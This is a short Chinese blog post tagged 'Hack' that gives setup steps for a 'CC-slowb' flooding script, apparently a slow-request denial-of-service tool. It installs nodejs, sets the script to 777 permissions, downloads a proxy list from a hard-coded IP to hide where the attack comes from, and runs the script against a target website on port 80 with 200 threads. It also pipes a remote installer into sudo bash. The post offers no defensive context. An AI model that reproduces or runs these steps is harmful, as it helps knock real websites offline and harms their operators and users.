---
title: CC-slowb脚本的基础搭建
date: 2024-06-26 16:05:50
tags: Hack
categories: Hack
---

我自己本身使用的是ubantu20

1、直接安装nodejs

```
sudo apt install -y nodejs
```

2、上传cc相关脚本

3、赋予777权限

```
chmod 777 slowb
```

4、安装curl 由于代码中需要用到代理所以每次执行命令前下载最新代理

```
 apt install curl
```

5、下载代理

```
curl -O http://15.204.18.143/proxy.txt
```

6、开始抚摸

```
./slowb 80 网址  proxy.txt 200 ua.txt
```

注意！！！：如果是centos环境需要执行（下载安装node环境）：

1、curl -fsSL https://rpm.nodesource.com/setup_16.x | sudo bash -

2、sudo yum install -y nodejs